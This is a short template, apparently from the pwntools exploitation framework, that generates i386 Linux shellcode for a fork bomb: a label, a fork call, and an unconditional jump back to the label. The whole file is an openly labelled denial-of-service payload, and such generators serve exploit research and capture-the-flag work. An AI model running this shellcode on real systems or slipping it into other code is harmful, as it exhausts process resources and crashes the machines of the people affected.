<%
    from pwnlib.shellcraft.i386.linux import fork
    from pwnlib.shellcraft.common import label
%>
<%docstring>
Performs a forkbomb attack.
</%docstring>
<%
    dosloop = label('fork_bomb')
%>
${dosloop}:
    ${fork()}
    jmp ${dosloop}
